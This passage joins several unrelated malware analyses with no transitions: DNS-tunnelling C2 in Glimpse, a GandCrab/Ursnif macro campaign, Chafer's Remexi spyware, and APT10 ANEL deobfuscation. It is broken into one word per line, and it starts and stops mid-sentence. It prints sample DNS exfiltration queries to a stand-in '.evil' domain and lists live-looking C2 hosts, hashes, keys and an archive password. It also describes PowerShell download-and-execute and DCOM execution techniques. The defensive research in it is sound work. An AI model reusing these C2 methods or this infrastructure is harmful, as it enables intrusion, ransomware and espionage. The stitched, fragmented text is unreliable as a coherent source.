230019e965eca60000A16DC20T.EBB466767667256666772556776662FBFD932F3F64079E4F730B65239FE0.33333210100A.sample-domain.evil
,
Response:
39.2.3.2
,
Query:
392e002965eca60000C6D18C42T.33232333332333500262233332466710E0E18362E239DDA839020190D932.33333210100A.sample-domain.evil
.
 
When
the
send
loop
has
fewer
than
60
bytes
to
send
(e.g.,
a
small
file
or
the
last
part
of
a
file),
the
send
function
transmits
the
remaining
bytes
with
a
shorter
data
section
.
 
When
there
are
no
more
bytes
to
send,
a
hardcoded
file
end
marker
COCTabCOCT
is
sent
in
the
data
section
and
the
send
loop
will
be
exited
.
 
The
controller
responds
with
the
253.25.42.87
A
record
response
.
 
Query:
239055e965eca60000CC30T.66654667676673003300C93CC92212953EDACEDA.33333210100A.sample-domain.evil
,
Response:
39.2.3.56
,
Query:
05639e9652eca6000057C06T.COCTabCOCT33333210100A.sample-domain.evil
,
Response:
253.25.42.87
.
 
Once
an
A
record
response
is
received
by
the
malware
containing
253.25.42.87
,
several
variables
are
set
in
preparation
to
exit
the
send
operation
.
 
After
the
send
operation
is
complete,
the
lock
file
for
the
current
run
is
deleted
and
the
script
exits
.
 
Many
of
the
capabilities
discovered
in
Glimpse
were
also
present
in
the
malware
analyzed
in
part
one
of
this
series
.
 
Glimpse
added
the
ability
to
use
an
alternate
DNS
resource
record
type
(TXT)
as
opposed
to
solely
relying
on
A
resource
records
for
DNS
queries
.
 
Using
TXT
resource
records
enabled
the
actors
to
provide
tasking
in
fewer
transactions
due
to
the
amount
of
data
that
can
be
transmitted
in
a
TXT
response
.
 
To
support
this
capability,
the
adversaries
chose
to
manually
craft
the
DNS
queries
and
communicate
directly
with
the
controller
as
opposed
to
using
existing
.NET
DNS
libraries
.
 
The
differences
between
PoisonFrog
and
Glimpse
highlight
the
ease
at
which
adversaries
can
modify
their
tools
to
meet
their
end
objectives
.
 
With
regard
to
detection,
several
methods
can
be
used
to
identify
this
type
of
C2
activity
.
 
Performing
entropy
calculations
on
subdomain
labels
can
help
highlight
the
amount
of
randomness
in
a
label,
but
this
is
just
one
of
many
possible
data
analysis
points,
since
a
standalone
feature
may
not
be
enough
to
determine
whether
traffic
is
malicious
.
 
The
IronDefense
Network
Traffic
Analysis
platform
combines
several
behavioral
detection
methods
alongside
historical
network
information
to
detect
the
C2
techniques
used
by
Glimpse
and
other
malware
.
 
Carbon
Black
TAU
ThreatSight
Analysis
GandCrab
and
Ursnif
Campaign
.
 
The
Carbon
Black
ThreatSight
team
observed
an
interesting
campaign
over
the
last
month
.
 
ThreatSight
worked
with
the
Threat
Analysis
Unit
(
TAU
)
to
research
the
campaign
.
 
This
report
is
being
released
to
help
researchers
and
security
practitioners
combat
this
campaign
as
new
samples
are
being
discovered
in
the
wild
daily
.
 
This
attack
,
if
successful
,
can
infect
a
compromised
system
with
both
Ursnif
malware
and
GandCrab
ransomware
.
 
The
overall
attack
leverages
several
different
approaches
,
which
are
popular
techniques
amongst
red
teamers
,
espionage
focused
adversaries
,
and
large
scale
criminal
campaigns
.
 
This
campaign
originally
came
in
via
phishing
emails
that
contained
an
attached
Word
document
with
embedded
macros
,
Carbon
Black
located
roughly
180
variants
in
the
wild
.
 
The
macro
would
call
an
encoded
PowerShell
script
and
then
use
a
series
of
techniques
to
download
and
execute
both
a
Ursnif
and
GandCrab
variant
.
 
This
campaign
has
been
discussed
at
a
high
level
by
other
researchers
publicly
.
 
Carbon
Black
product
specific
content
can
be
located
in
the
User
Exchange
.
 
In
this
campaign
the
attackers
used
a
MS
Word
document
(
.doc
format
)
to
deliver
the
initial
stages
.
 
It
should
be
noted
that
out
of
the
roughly
180
Word
variants
that
were
located
by
Carbon
Black
,
the
biggest
difference
in
the
documents
was
the
metadata
and
junk
data
located
in
the
malicious
macros
.
 
However
the
metadata
clearly
showed
that
the
documents
prepared
for
this
campaign
were
initially
saved
on
December
17
,
2018
and
have
continued
to
be
updated
through
January
21
,
2019
.
 
Several
metadata
fields
(
specifically
title
,
subject
,
author
,
comments
,
manager
,
and
company
)
appear
to
have
been
populated
with
different
data
sets
.
 
For
example
the
subject
in
all
the
samples
was
a
combination
of
a
US
state
and
a
common
first
name
(
like
Utah
Erick
or
Tennessee
Dayna
)
.
 
For
this
post
the
following
sample
was
analyzed
.
 
Richard_Johnson.doc
:
878e4e8677e68aba918d930f2cc67fbe
0a3f915dd071e862046949885043b3ba61100b946cbc0d84ef7c44d77a50f080
.
 
The
document
contained
a
VBS
macro
that
once
decompressed
was
approximately
650
lines
of
code
.
 
The
vast
majority
of
that
was
junk
code
.
 
Once
the
junk
code
was
removed
from
the
VBScript
,
there
are
approximately
18
lines
of
relevant
code
,
which
ultimately
call
a
shape
box
in
the
current
document
.
 
The
variable
names
themselves
are
not
relevant
,
however
the
methods
in
bold
below
will
retrieve
the
AlternativeText
field
from
the
specified
shape
,
which
is
then
executed
.
 
The
alternate
text
can
easily
be
observed
in
the
body
of
the
office
document
.
 
The
area
highlighted
in
blue
is
the
shape
name
that
is
being
located
,
while
the
text
itself
is
highlighted
in
red
.
 
It
is
clear
that
the
text
is
a
base64
encoded
command
,
that
is
then
executed
by
the
above
VBScript
.
 
The
PowerShell
script
will
first
create
an
instance
of
the
.Net
Webclient
class
and
then
enumerate
the
available
methods
using
the
GetMethods()
call
(
highlighted
in
the
image
in
red
)
.
 
The
enumerated
methods
are
stored
,
then
a
for
loop
looks
first
for
the
method
named
DownloadString
(
highlighted
in
blue
)
.
 
If
the
DownloadString
method
is
located
it
will
contact
the
hard
coded
C2
requesting
a
file
,
which
is
downloaded
and
then
invoked
(
highlighted
in
blue
)
.
 
It
should
be
noted
that
because
the
requested
resource
is
being
stored
as
a
string
and
executed
,
this
all
occurs
in
memory
.
 
Additional
Analysis
of
the
downloaded
string
is
provided
in
the
Gandcrab
cradle
section
below
.
 
The
loop
then
looks
for
the
method
name
DownloadData
,
and
if
located
will
download
a
resource
from
a
second
C2
.
 
This
request
is
then
stored
in
the
CommonApplicationData
directory
(
C:\ProgramData
in
Vista
and
later
)
as
the
hard
coded
file
name
(
highlighted
in
green
)
.
 
The
script
will
utilize
the
hard
coded
DCOM
object
C08AFD90-F2A1-11D1-8455-00A0C91F3880
,
which
is
the
ClassID
for
the
ShellBrowserWindow
.
 
A
previous
blog
post
by
enigma0x3
,
detailed
how
this
CLSID
can
be
leveraged
to
instantiate
the
ShellBrowserWindow
object
and
call
the
ShellExecute
method
,
which
is
the
same
approach
that
was
taken
by
the
attackers
.
 
This
approach
has
also
been
used
in
different
Empire
modules
.
 
The
payloads
that
are
downloaded
in
the
above
steps
are
then
executed
on
the
system
.
 
The
first
payload
that
is
downloaded
via
the
DownloadString
method
highlighted
above
,
is
a
PowerShell
one-liner
that
uses
an
IF
statement
to
evaluate
the
architecture
of
the
compromised
system
,
and
then
downloads
a
additional
payload
from
pastebin.com
.
 
This
additional
payload
is
then
executed
in
memory
.
 
The
image
below
depicts
the
contents
of
the
o402ek2m.php
file
.
 
It
should
be
noted
that
the
contents
of
o402ek2m.php
were
updated
by
the
attackers
to
reference
different
pastebin
uploads
throughout
this
campaign
.
 
Also
updated
was
the
function
name
that
is
invoked
,
in
the
example
below
it
was
CJOJFNUWNQKRTLLTMCVDCKFGG
,
however
this
was
dynamically
changed
to
match
the
name
of
the
function
that
would
be
present
in
pastebin
file
that
was
being
downloaded
.
 
Once
the
raw
contents
of
the
pastebin.com
post
were
downloaded
,
that
data
would
also
be
executed
in
memory
.
 
In
the
variants
that
were
obtained
during
this
campaign
the
file
contained
a
PowerShell
script
that
was
approximately
2800
lines
.
 
This
PowerShell
script
is
a
version
of
the
Empire
Invoke-PSInject
module
,
with
very
few
modifications
.
 
The
majority
if
the
modifications
are
of
removing
comments
and
renaming
variables
.
 
The
script
will
take
an
embedded
PE
file
that
has
been
base64
encoded
and
inject
that
into
the
current
PowerShell
process
.
 
The
image
below
is
the
main
function
that
is
being
called
which
in
turns
calls
the
function
responsible
for
injecting
the
embedded
PE
file
.
 
The
base64
encoded
PE
file
that
can
be
seen
in
line
2760
of
the
image
above
is
a
GandCrab
Variant
.
 
This
variant
(
the
metadata
for
which
is
listed
below
)
is
Gandcrab
version
5.0.4
.
 
krab5.dll
:
0f270db9ab9361e20058b8c6129bf30e
d6c53d9341dda1252ada3861898840be4d669abae2b983ab9bf5259b84de7525
,
Mon
Oct
29
17:39:23
2018
UTC
.
 
krab5.text
:
019bc7edf8c2896754fdbdbc2ddae4ec
.
 
krab5.rdata
:
d6ed79624f7af19ba90f51379b7f31e4
.
 
krab5.data
:
1ec7b57b01d0c46b628a991555fc90f0
.
 
krab5.rsrc
:
89b7e19270b2a5563c301b84b28e423f
.
 
krab5.reloc
:
685c3c775f65bffceccc1598ff7c2e59
.
 
The
second
payload
,
downloaded
via
the
DownloadData
method
,
is
a
Ursnif
executable
.
 
In
this
instance
it
is
saved
to
the
C:\ProgramData
directory
with
a
pseudo
random
name
.
 
It
should
be
noted
that
the
file
name
was
changed
throughout
this
campaign
.
 
Once
executed
the
Ursnif
sample
will
conduct
the
typical
actions
observed
in
Ursnif
samples
,
like
credential
harvesting
,
gathering
system
and
process
information
,
and
deploying
additional
malware
samples
.
 
The
information
for
this
specific
sample
is
listed
below
.
 
However
,
numerous
Ursnif
variants
were
hosted
on
the
bevendbrec.com
site
during
this
campaign
.
 
Carbon
Black
was
able
to
discover
approximately
120
different
Ursnif
variants
that
were
being
hosted
from
the
domains
iscondisth.com
and
bevendbrec.com
.
 
irongreen.exe
:
404d25e3a18bda19a238f77270837198
c064f6f047a4e39014a29c8c95526c3fe90d7bcea5ef0b8f21ea306c27713d1f
,
Sun
Dec
18
11:04:31
2011
UTC
.
 
irongreen.text
:
85aa9117c381eae3d181ab63daab335e
.
 
irongreen.rdata
:
3e1c774bc4e0ffc2271075e621aa3f3d
.
 
irongreen.data
:
6c389e5e301564f65dcad4811dbded8b
.
 
irongreen.rsrc
:
efba623cc62ffd0ccbf7f3fbf6264905
.
 
irongreen.reloc
:
6cf46599a57a6cbc5d18fbb2883620ce
.
 
While
researching
this
campaign
approximately
180
variants
were
located
in
the
wild
.
 
Using
the
VirusTotal
Graph
functionality
these
variants
could
be
organized
into
several
groups
that
were
commonly
associated
by
either
metadata
or
document
structures
like
macros
or
embedded
image
files
(
depicted
in
the
image
below
)
.
 
The
image
below
highlights
the
nodes
associated
with
the
samples
analyzed
in
this
report
.
 
The
graph
can
also
be
viewed
in
the
VTGraph
Console
for
additional
exploration
.
 
The
graph
highlights
the
at
least
3
different
variants
of
Ursnif
that
were
being
hosted
on
the
bevendbrec.com
site
.
 
The
Ursnif
variants
were
primarily
grouped
by
C2
infrastructure
.
 
The
large
grouping
on
the
right
of
the
diagram
are
direct
variants
of
the
sample
referenced
in
this
write
up
.
 
Samples
in
this
grouping
were
all
hosted
on
sites
that
were
called
by
the
second
stage
.
 
The
samples
had
minor
changes
,
and
were
presumably
changed
by
the
attackers
to
avoid
detection
by
hash
.
 
Word
Dropper
Variant
cc5a14ff026ee593d7d25f213715b73833e6b9cf71091317121a009d5ad7fc36
7ce3d9fc86396fac9865607594395e94
Word
Dropper
Variant
28a8d6b8a0cdcb25d098e403cc8b6dcb855cb591f0b54c2e3363b5c580d92b28
74c7aed44680100e984251ce2cdbdbc6
Word
Dropper
Variant
facbc2cb089668197ca3968a3433b6f4826430c13f7d1c75b44667307c67dfe3
10f308d78adda567d4589803ce18cc9b
Word
Dropper
Variant
e714a5147335245c386b105bb7494a8b190b6a737ba28f029561efe48105cd11
f279d0f04874327b85221697d99de321
Word
Dropper
Variant
56c46ef3d5bd544fa35f6e336d3be93cf36e72d0273fa1dbc915979f2d883e9d
bc1b322e7efc19417ab0d0524ccb9ff2
.
 
Ursnif
Variant
446ffd272c79554a19b5f4299327fb74b8ff457681d10571caa6eea51ec406b0
ea7e1650031c92b7377788f05926034e
Ursnif
Variant
42636f3185c9e398958aad272d983c8b8b1409df4ce93f1f8f608e190290f56d
377cd85d8d68fc58976a123aa151c5e0
Ursnif
Variant
24b2141c1134ef14f33a38c58342b6573940c5460d03a2945fafac36e32e6889
b73cbffea8094cfa18b067d9568c53e7
Ursnif
Variant
e53b0a60c238c45019089bdf7f16d5f47b7ba15ca2c918e385c41f0c2076eb52
24fe5a6196e32749cd030ab51824cabe
Ursnif
Variant
4c8de1713f830819e8354b653fd19a5cafd0bc8fa3145eedf555f24261c874de
589734cb60aa515599c687539c520049
.
 
GandCrab
Variant
d6c53d9341dda1252ada3861898840be4d669abae2b983ab9bf5259b84de7525
ce1ee671fe5246a9c40b624ef97e4de1
GandCrab
Variant
aca0b96126c813b0d29d6fbff9175f8ca62ff2ec6eed83bff76a73ae717cfcb8
07f955796a252771861c8e0db06b1f01
GandCrab
Variant
8cd45f8c8f2ed0109db6a64f9945f3dcb8a780f65c76aedded7b8af95e6dc7ec
4fcd0d13ea669a83a749ae5bfb098ca2
GandCrab
Variant
933210a9d19b25e0711ae88eece1ba06bb035a01ab2880cc707ff55bdd3b8dd0
8ec87fd3ea777fa8d5160dc957e6683e
GandCrab
Variant
e564e87958b3e76bc9bfeb5bed773b7a17f3a82f84872acdbb609aa43a9cd776
c7d5077960882259b85c01fd41c49ffd
.
 
Chafer
used
Remexi
malware
to
spy
on
Iran-based
foreign
diplomatic
entities
Throughout
the
autumn
of
2018
we
analyzed
a
long-standing
(and
still
active
at
that
time)
cyber-espionage
campaign
that
was
primarily
targeting
foreign
diplomatic
entities
based
in
Iran
.
 
The
attackers
were
using
an
improved
version
of
Remexi
in
what
the
victimology
suggests
might
be
a
domestic
cyber-espionage
operation
.
 
This
malware
has
previously
been
associated
with
an
APT
actor
that
Symantec
calls
Chafer
.
 
The
malware
can
exfiltrate
keystrokes,
screenshots,
browser-related
data
like
cookies
and
history,
decrypted
when
possible
.
 
The
attackers
rely
heavily
on
Microsoft
technologies
on
both
the
client
and
server
sides:
the
Trojan
uses
standard
Windows
utilities
like
Microsoft
Background
Intelligent
Transfer
Service
(BITS
)
bitsadmin.exe
to
receive
commands
and
exfiltrate
data
.
 
Its
C2
is
based
on
IIS
using
.asp
technology
to
handle
the
victims
HTTP
requests
.
 
Remexi
developers
use
the
C
programming
language
and
GCC
compiler
on
Windows
in
the
MinGW
environment
.
 
They
most
likely
used
the
Qt
Creator
IDE
in
a
Windows
environment
.
 
The
malware
utilizes
several
persistence
mechanisms
including
scheduled
tasks,
Userinit
and
Run
registry
keys
in
the
HKLM
hive
.
 
XOR
and
RC4
encryption
is
used
with
quite
long
unique
keys
for
different
samples
.
 
Among
all
these
random
keys
once
the
word
salamati
was
also
used,
which
means
health
in
Farsi
.
 
Kaspersky
Lab
products
detect
the
malware
described
in
this
report
as
Trojan.Win32.Remexi
and
Trojan.Win32.Agent
.
 
This
blogpost
is
based
in
our
original
report
shared
with
our
APT
Intelligence
Reporting
customers
last
November
2018
.
 
The
main
tool
used
in
this
campaign
is
an
updated
version
of
the
Remexi
malware,
publicly
reported
by
Symantec
back
in
2015
.
 
The
newest
modules
compilation
timestamp
is
March
2018
.
 
The
developers
used
GCC
compiler
on
Windows
in
the
MinGW
environment
.
 
Inside
the
binaries
the
compiler
left
references
to
the
names
of
the
C
source
file
modules
used:
operation_reg.c
,
thread_command.c
and
thread_upload.c
.
 
Like
mentioned
in
modules
file
names
the
malware
consists
of
several
working
threads
dedicated
to
different
tasks,
including
C2
command
parsing
and
data
exfiltration
.
 
For
both
the
receiving
of
C2
commands
and
exfiltration,
Remexi
uses
the
Microsoft
Background
Intelligent
Transfer
Service
(BITS
)
mechanism
to
communicate
with
the
C2
over
HTTP
.
 
So
far,
our
telemetry
hasnt
provided
any
concrete
evidence
that
shows
us
how
the
Remexi
malware
spread
.
 
However,
we
think
its
worth
mentioning
that
for
one
victim
we
found
a
correlation
between
the
execution
of
Remexis
main
module
and
the
execution
of
an
AutoIt
script
compiled
as
PE
,
which
we
believe
may
have
dropped
the
malware
.
 
This
dropper
used
an
FTP
with
hardcoded
credentials
to
receive
its
payload
.
 
FTP
server
was
not
accessible
any
more
at
the
time
of
our
analysis
.
 
Remexi
boasts
features
that
allow
it
to
gather
keystrokes,
take
screenshots
of
Windows
of
interest
(as
defined
in
its
configuration),
steal
credentials,
logons
and
the
browser
history,
and
execute
remote
commands
.
 
Encryption
consists
of
XOR
with
a
hardcoded
key
for
its
configuration
and
RC4
with
a
predefined
password
for
encrypting
the
victims
data
.
 
Remexi
includes
different
modules
that
it
deploys
in
its
working
directory,
including
configuration
decryption
and
parsing,
launching
victim
activity
logging
in
a
separate
module,
and
seven
threads
for
various
espionage
and
auxiliary
functions
.
 
The
Remexi
developers
seem
to
rely
on
legitimate
Microsoft
utilities,
which
we
enumerate
in
the
table
below
extract.exe
Deploys
modules
from
the
.cab
file
into
the
working
Event
Cache
directory,
bitsadmin.exe
Fetches
files
from
the
C2
server
to
parse
and
execute
commands
.
 
Send
exfiltrated
data,
taskkill.exe
Ends
working
cycle
of
modules
.
 
Persistence
modules
are
based
on
scheduled
tasks
and
system
registry
.
 
Mechanisms
vary
for
different
OS
versions
.
 
In
the
case
of
old
Windows
versions
like
XP
,
main
module
events.exe
runs
an
edited
XPTask.vbs
Microsoft
sample
script
to
create
a
weekly
scheduled
task
for
itself
.
 
For
newer
operating
systems,
events.exe
creates
task.xml
.
 
To
decrypt
the
configuration
data,
the
malware
uses
XOR
with
25-character
keys
such
as
waEHleblxiQjoxFJQaIMLdHKz
that
are
different
for
every
sample
.
 
RC4
file
encryption
relies
on
the
Windows
32
CryptoAPI
,
using
the
provided
values
MD5
hash
as
an
initial
vector
.
 
Among
all
these
random
keys
once
the
word
salamati
was
also
used,
which
means
health
in
Farsi
.
 
Config.ini
is
the
file
where
the
malware
stores
its
encrypted
configuration
data.List
of
files
to
send
to
C2
using
bitsadmin.exe
from
the
dedicated
thread:
upLog.txt
,
upSCRLog.txt
,
upSpecial.txt
,
upFile.txt
,
upMSLog.txt
.
 
http://108.61.189.174
control
server
HTTP
URL
.
 
KtJvOXulgibfiHk
is
the
password
for
uploaded
zip
archives
.
 
One
of
the
malware
threads
checks
in
an
infinite
loop
if
the
mouse
button
was
pressed
and
then
also
increments
the
integer
iterator
infinitely
.
 
If
the
mouse
hooking
function
registers
a
button
hit,
it
lets
the
screenshotting
thread
know
about
it
through
a
global
variable
.
 
After
that,
it
checks
if
the
iterator
divided
by
(captureScreenTimeOut/captureActiveWindowTimeOut)
has
a
remainder
of
0
.
 
In
that
case,
it
takes
a
screenshot
.
 
events.exe
:
b1fa803c19aa9f193b67232c9893ea57574a2055791b3de9f836411ce000ce31
,
c981273c32b581de824e1fd66a19a281
,
GCC
compiler
in
MinGW
environment
version
2.24,
I386
Windows
GUI
EXE
.
 
After
checking
that
the
malware
is
not
already
installed
,
it
unpacks
HCK.cab
using
the
Microsoft
standard
utility
expand.exe
.
 
Splitter.exe
:
a77f9e441415dbc8a20ad66d4d00ae606faab370ffaee5604e93ed484983d3ff
,
1ff40e79d673461cd33bd8b68f8bb5b8
,
2017.08.06
11:32:36
(GMT),
I386
Windows
Console
EXE
.
 
Exfiltration
is
done
through
the
bitsadmin.exe
utility
.
 
The
BITS
mechanism
has
existed
since
Windows
XP
up
to
the
current
Windows
10
versions
and
was
developed
to
create
download/upload
jobs,
mostly
to
update
the
OS
itself
.
 
The
vast
majority
of
the
users
targeted
by
this
new
variant
of
Remexi
appear
to
have
Iranian
IP
addresses
.
 
Some
of
these
appear
to
be
foreign
diplomatic
entities
based
in
the
country
.
 
The
Remexi
malware
has
been
associated
with
an
APT
actor
called
Chafer
by
Symantec
.
 
One
of
the
human-readable
encryption
keys
used
is
salamati
.
 
This
is
probably
the
Latin
spelling
for
the
word
health
in
Farsi
.
 
Among
the
artifacts
related
to
malware
authors,
we
found
in
the
binaries
a
.pdb
path
containing
the
Windows
user
name
Mohamadreza
New
.
 
Interestingly,
the
FBI
website
for
wanted
cybercriminals
includes
two
Iranians
called
Mohammad
Reza,
although
this
could
be
a
common
name
or
even
a
false
flag
.
 
Activity
of
the
Chafer
APT
group
has
been
observed
since
at
least
2015
,
but
based
on
things
like
compilation
timestamps
and
C&C
registration,
its
possible
they
have
been
active
for
even
longer
.
 
Defeating
Compiler-Level
Obfuscations
Used
in
APT10
Malware
.
 
The
Carbon
Black
Threat
Analysis
Unit
(
TAU
)
recently
analyzed
a
series
of
malware
samples
that
utilized
compiler-level
obfuscations
.
 
For
example
,
opaque
predicates
were
applied
to
Turla
mosquito
and
APT10
ANEL
.
 
Another
obfuscation
,
control
flow
flattening
,
was
applied
to
APT10
ANEL
and
Dharma
ransomware
packer
.
 
ANEL
(
also
referred
to
as
UpperCut
)
is
a
RAT
program
used
by
APT10
and
observed
in
Japan
uniquely
.
 
According
to
SecureWorks
,
all
ANEL
samples
whose
version
is
5.3.0
or
later
are
obfuscated
with
opaque
predicates
and
control
flow
flattening
.
 
Opaque
predicate
is
a
programming
term
that
refers
to
decision
making
where
there
is
actually
only
one
path
.
 
For
example
,
this
can
be
seen
as
calculating
a
value
that
will
always
return
True
.
 
Control
flow
flattening
is
an
obfuscation
method
where
programs
do
not
cleanly
flow
from
beginning
to
end
.
 
Instead
,
a
switch
statement
is
called
in
an
infinite
loop
having
multiple
code
blocks
each
performing
operations
.
 
The
obfuscations
looked
similar
to
the
ones
explained
in
Hex-Rays
blog
,
but
the
introduced
IDA
Pro
plugin
HexRaysDeob
didnt
work
for
one
of
the
obfuscated
ANEL
samples
because
the
tool
was
made
for
another
variant
of
the
obfuscation
.
 
TAU
investigated
the
ANEL
obfuscation
algorithms
then
modified
the
HexRaysDeob
code
to
defeat
the
obfuscations
.
 
After
the
modification
,
TAU
was
able
to
recover
the
original
code
.
 
HexRaysDeob
is
an
IDA
Pro
plugin
written
by
Rolf
Rolles
to
address
obfuscation
seen
in
binaries
.
 
In
order
to
perform
the
deobfuscation
,
the
plugin
manipulates
the
IDA
intermediate
language
called
microcode
.
 
If
you
arent
familiar
with
those
structures
(
e.g
,
microcode
data
structures
,
maturity
level
,
Microcode
Explorer
and
so
on
)
,
you
should
read
his
blog
post
.
 
Rolles
also
provides
an
overview
of
each
obfuscation
technique
in
the
same
post
.
 
HexRaysDeob
installs
two
callbacks
when
loading
:
optinsn_t
for
defeating
opaque
predicates
(
defined
as
ObfCompilerOptimizer
)
optblock_t
for
defeating
control
flow
flattening
(
defined
as
CFUnflattener
)
.
 
Before
continuing
,
it
is
important
to
understand
Hex-Rays
maturity
levels
.
 
When
a
binary
is
loaded
into
IDA
Pro
,
the
application
will
perform
distinct
layers
of
code
analysis
and
optimization
,
referred
to
as
maturity
levels
.
 
One
layer
will
detect
shellcode
,
another
optimizes
it
into
blocks
,
another
determines
global
variables
,
and
so
forth
.
 
The
optinsn_t
:
:f
unc
callback
function
is
called
in
maturity
levels
from
MMAT_ZERO
(
microcode
does
not
exist
)
to
MMAT_GLBOPT2
(
most
global
optimizations
completed
)
.
 
During
the
callback
,
opaque
predicates
pattern
matching
functions
are
called
.
 
If
the
code
pattern
is
matched
with
the
definitions
,
it
is
replaced
with
another
expression
for
the
deobfuscation
.
 
This
is
important
to
perform
in
each
maturity
level
as
the
obfuscated
code
could
be
modified
or
removed
as
the
code
becomes
more
optimized
.
 
We
defined
two
patterns
for
analysis
of
the
ANEL
sample
.
 
The
global
variable
value
dword_745BB58C
is
either
even
or
odd
,
so
dword_745BB58C
*
(
dword_745BB58C
1
)
is
always
even
.
 
This
results
in
the
lowest
bit
of
the
negated
value
becoming
1
.
 
Thus
,
OR
by
-2
(
0xFFFFFFFE
)
will
always
produce
the
value
-1
.
 
In
this
case
,
the
pattern
matching
function
replaces
dword_745BB58C
*
(
dword_745BB58C
1
)
with
2
.
 
The
global
variable
value
dword_72DBB588
is
always
0
because
the
value
is
not
initialized
(
we
can
check
it
by
is_loaded
API
)
and
has
only
read
accesses
.
 
So
the
pattern
matching
function
replaces
the
global
variable
with
0
.
 
There
are
some
variants
with
this
pattern
(
e.g
,
the
variable
10
<
0
)
,
where
the
immediate
constant
can
be
different
.
 
We
also
observed
a
pattern
that
was
also
using
an
8-bit
portion
of
the
register
.
 
In
the
following
example
,
the
variable
v5
in
pseudocode
is
a
register
operand
(
cl
)
in
microcode
.
 
We
need
to
check
if
the
value
comes
from
the
result
of
x
*
(
x
1
)
.
 
In
another
example
,
the
variable
v2
in
pseudocode
is
a
register
operand
(
ecx
)
in
microcode
.
 
We
have
to
validate
if
a
global
variable
with
above-mentioned
conditions
is
assigned
to
the
register
.
 
Data-flow
tracking
code
was
added
to
detect
these
use-cases
.
 
The
added
code
requires
that
the
mblock_t
pointer
information
is
passed
from
the
argument
of
optinsn_t
:
:f
unc
to
trace
back
previous
instructions
using
the
mblock_t
linked
list
.
 
However
,
the
callback
returns
NULL
from
the
mblock_t
pointer
if
the
instruction
is
not
a
top-level
one
.
 
If
the
setl
is
always
sub-instruction
during
the
optimization
,
we
never
get
the
pointer
.
 
To
handle
this
type
of
scenario
,
the
code
was
modified
to
catch
and
pass
the
mblock_t
of
the
jnz
instruction
to
the
sub-instruction
.
 
The
original
implementation
calls
the
optblock_t
:
:f
unc
callback
function
in
MMAT_LOCOPT
(
local
optimization
and
graphing
are
complete
)
maturity
level
.
 
Rolles
previously
explained
the
unflattening
algorithm
in
a
Hex-Rays
blog
.
 
For
brevity
I
will
quickly
cover
some
key
points
to
understand
the
algorithm
at
a
high
level
.
 
Normally
the
call
flow
graph
(
CFG
)
of
a
function
obfuscated
with
control
flow
flattening
has
a
loop
structure
starting
with
yellow-colored
control
flow
dispatcher
like
this
,
shown
after
the
First
Block
.
 
The
original
code
is
separated
into
the
orange-colored
first
block
and
green-colored
flattened
blocks
.
 
The
analyst
is
then
required
to
resolve
the
correct
next
block
and
modify
the
destination
accordingly
.
 
The
next
portion
of
first
block
and
each
flattened
block
is
decided
by
a
block
comparison
variable
with
an
immediate
value
.
 
The
value
of
the
variable
is
assigned
to
a
specific
register
in
each
block
then
compared
in
a
control
flow
dispatcher
and
other
condition
blocks
.
 
If
the
variable
registers
for
the
comparison
and
assignment
are
different
,
the
assignment
variable
is
called
block
update
variable
(
which
is
further
explained
later
)
.
 
The
algorithm
looks
straightforward
however
some
portions
of
the
code
had
to
be
modified
in
order
to
correctly
deobfuscate
the
code
.
 
This
is
further
detailed
below
.
 
As
previously
detailed
,
the
original
implementation
of
the
code
only
works
in
MMAT_LOCOPT
maturity
level
.
 
Rolles
said
this
was
to
handle
another
obfuscation
called
Odd
Stack
Manipulations
,
referred
in
his
blog
)
.
 
However
the
unflattening
of
ANEL
code
had
to
be
performed
in
the
later
maturity
level
since
the
assignment
of
block
comparison
variable
heavily
depends
on
opaque
predicates
.
 
As
an
example
in
the
following
obfuscated
function
,
the
v3
and
v7
variables
are
assigned
to
the
block
comparison
variable
(
b_cmp
)
.
 
However
the
values
are
dependent
on
opaque
predicates
results
.
 
Once
the
opaque
predicates
are
broken
,
the
loop
code
becomes
simpler
.
 
Unflattening
the
code
in
later
maturity
levels
like
MMAT_GLBOPT1
and
MMAT_GLBOPT2
(
first
and
second
pass
of
global
optimization
)
caused
additional
problems
.
 
The
unflattening
algorithm
requires
mapping
information
between
block
comparison
variable
and
the
actual
block
number
(
mblock_t
:
:s
erial
)
used
in
the
microcode
.
 
In
later
maturity
levels
,
some
blocks
are
deleted
by
the
optimization
after
defeating
opaque
predicates
,
which
removes
the
mapping
information
.
 
In
the
example
below
,
the
blue-highlighted
immediate
value
0x4624F47C
is
assigned
to
block
comparison
variable
in
the
first
block
.
 
The
mapping
can
be
created
by
checking
the
conditional
jump
instruction
(
jnz
)
in
MMAT_LOCOPT
.
 
Additionally
here
is
no
mapping
information
in
MMAT_GLBOPT2
because
the
condition
block
that
contains
the
variable
has
been
deleted
.
 
So
the
next
block
of
the
first
one
in
the
level
can
not
be
determined
.
 
To
resolve
that
issue
,
the
code
was
written
to
link
the
block
comparison
variable
and
block
address
in
MMAT_LOCOPT
,
as
the
block
number
is
changed
in
each
maturity
level
.
 
If
the
code
cant
determine
the
mapping
in
later
maturity
levels
,
it
attempts
to
guess
the
next
block
number
based
on
the
address
,
considering
each
block
and
instruction
addresses
.
 
The
guessing
is
not
100%
accurate
however
it
works
for
the
majority
of
obfuscated
functions
tested
.
 
Though
the
original
implementation
assumes
an
obfuscated
function
has
only
one
control
flow
dispatcher
,
some
functions
in
the
ANEL
sample
have
multiple
control
dispatchers
.
 
Originally
the
code
called
the
optblock_t
:
:f
unc
callback
in
MMAT_GLBOPT1
and
MMAT_GLBOPT2
,
as
the
result
was
not
correct
in
MMAT_CALLS
(
detecting
call
arguments
)
.
 
However
,
this
did
not
work
for
functions
with
three
or
more
dispatchers
.
 
Additionally
,
Hex-Rays
kernel
doesnt
optimize
some
functions
in
MMAT_GLBOPT2
if
it
judges
the
optimization
within
the
level
is
not
required
.
 
In
this
case
,
the
callback
is
executed
just
once
in
the
implementation
.
 
To
handle
multiple
control
flow
dispatchers
,
a
callback
for
decompiler
events
was
implemented
.
 
The
code
catches
the
hxe_prealloc
event
(
according
to
Hex-Rays
,
this
is
the
final
event
for
optimizations
)
then
calls
optblock_t
:
:f
unc
callback
.
 
Typically
this
event
occurs
a
few
times
to
several
times
,
so
the
callback
can
deobfuscate
multiple
control
flow
flattenings
.
 
Other
additional
modifications
were
made
to
the
code
(
e.g
,
writing
a
new
algorithm
for
finding
control
flow
dispatcher
and
first
block
,
validating
a
block
comparison
variable
,
and
so
on
)
.
 
After
the
modification
,
for
example
,
the
following
functions
with
multiple
control
flow
dispatchers
can
be
unflattened
.
 
The
original
implementation
supports
the
following
two
cases
of
flattened
blocks
to
find
a
block
comparison
variable
for
the
next
block
(
the
cases
are
then
simplified
)
.
 
In
the
second
